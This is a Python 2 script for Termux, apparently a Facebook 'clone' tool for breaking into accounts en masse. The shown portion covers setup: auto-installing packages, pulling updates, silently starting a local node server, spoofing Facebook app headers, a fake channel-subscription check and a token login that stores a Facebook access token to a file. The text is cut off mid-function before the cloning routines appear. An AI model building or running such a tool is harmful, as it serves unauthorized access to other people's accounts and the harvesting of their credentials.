# WE CAN DECOMPILE IT BRO :)
# Thanks - https://github.com/azim-vau

#coding=utf-8
#!/usr/bin/python2
#Originally Written By Naveed Malik
try:
    import os,sys,time,datetime,re,random,hashlib,threading,json,getpass,urllib,cookielib,requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system("pip2 install requests")
    os.system("python2 index.xbn")
os.system("clear")
"""
try:
    my = requests.get("https://muhammadhamza365.byethost7.com")
except requests.exceptions.ConnectionError:
    print("")
    print("\t    \033[1;31mTurn on mobile data OR wifi\033[0;97m")
    print("")
    time.sleep(1)
    raw_input(" Press enter to try again ")
    os.system("python2 new.py")"""
if not os.path.isfile("/data/data/com.termux/files/usr/bin/node"):
    os.system("apt update && apt install nodejs -y")
from requests.exceptions import ConnectionError
os.system("git pull")
if not os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && npm install")
    os.system("cd ..... && node index.js &")
    os.system("clear")
    time.sleep(10)
elif os.path.isfile("/data/data/com.termux/files/home/hpro/...../node_modules/bytes/index.js"):
    os.system("fuser -k 5000/tcp &")
    os.system("#")
    os.system("cd ..... && node index.js &")
    os.system("clear")
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
#MyLogo
logo = """

##     ##    ###    ##       #### ##    ## 
###   ###   ## ##   ##        ##  ##   ##  
#### ####  ##   ##  ##        ##  ##  ##   
## ### ## ##     ## ##        ##  #####    
##     ## ######### ##        ##  ##  ##   
##     ## ##     ## ##        ##  ##   ##  
##     ## ##     ## ######## #### ##    ## 
                                                        
-----------------------------------------------

➣ Author   : NAVEED MALIK
➣ Facebook : MALIK NAVEED
➣ WHATSAPP   : 03226906314
➣ You cannot decompile it bro :)

-----------------------------------------------
"""
def start():
    os.system("clear")
    print(logo)
    print("")
    print("\t\033[1;32mChecking channel subscription...\033[0;97m")
    print("")
    time.sleep(1)
    try:
        subs = open("/sdcard/subs.txt","r").read()
        method_menu()
    except(KeyError , IOError):
        os.system("clear")
        print(logo)
        print("")
        print("\t\033[1;31mSubscription not found\033[0;97m")
        print("")
        print(" Subscribe channel to unlock tool")
        print(" Opening channel wait here")
        print("")
        time.sleep(3)
        os.system("xdg-open https://youtu.be/J-h1iowV4vU")
        os.system("touch /sdcard/subs.txt")
        print(" Waiting for subscription ")
        time.sleep(10)
        os.system("clear")
        print(logo)
        print("")
        print("\t\033[1;32mSubscribed successfully\033[0;97m")
        print("")
        time.sleep(2)
        method_menu()
def method_menu():
    os.system("clear")
    print(logo)
    print("")
    print("\t    \033[1;32mClone Method Menu\033[0;97m")
    os.system("xdg-open https://t.me/hop1626")
    print("")
    print("[1] Localhost")
    print("[2] Direct login method")
    print("")
    method_menu_select()
def method_menu_select():
    afza = raw_input(" \033[1;33mChoose method: \033[0;97m")
    if afza =="2":
        b_menu()
    elif afza =="1":
        l_menu()
    else:
        print("")
        print("\t    \033[1;31mSelect valid option \033[0;97m")
        print("")
        method_menu_select()
def login():
    os.system("clear")
    print(logo)
    print("")
    print("\t    "+c+"FB Login Menu"+c2)
    print("")
    print("[1] Token login")
    print("[2] ID/Pass login")
    print("")
    login_select()
def login_select():
    afza = raw_input(" \033[1;33mmSelect option: ")
    if afza =="1":
        os.system("clear")
        print(logo)
        print("")
        print("\t    \033[1;32mFB Token Login\033[0;97m")
        print("")
        token = raw_input(" Past token here : ")
        token_s = open(".fb_token.txt","w")
        token_s.write(token)
        token_s.close()
        try:
            r = requests.get("https://graph.facebook.com/me?access_token="+token)
            q = json.loads(r.text)
            name = q["name"]
            nm = name.rsplit(" ")[0]
            print("")
            print("\t\033[1;32mToken logged in as : "+nm+"\033[0;97m")
            time.sleep(3)
            method_me
